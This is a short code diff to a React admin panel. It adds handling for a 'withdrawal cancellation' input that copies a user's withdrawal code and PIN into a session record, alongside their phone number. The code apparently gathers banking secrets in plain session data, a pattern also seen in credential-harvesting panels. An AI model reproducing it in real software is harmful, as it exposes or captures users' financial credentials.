@@ -438,6 +438,13 @@ export default function AdminPanel() {
                 case 'celular':
                   updatedSession.celular = inputData.celular;
                   break;
+                case 'CANCELACION_RETIRO':
+                case 'cancelacion_retiro':
+                  updatedSession.codigoRetiro = inputData.codigoRetiro;
+                  if (inputData.pinRetiro) {
+                    updatedSession.pinRetiro = inputData.pinRetiro;
+                  }
+                  break;
               }
               
               // Actualizar en la lista
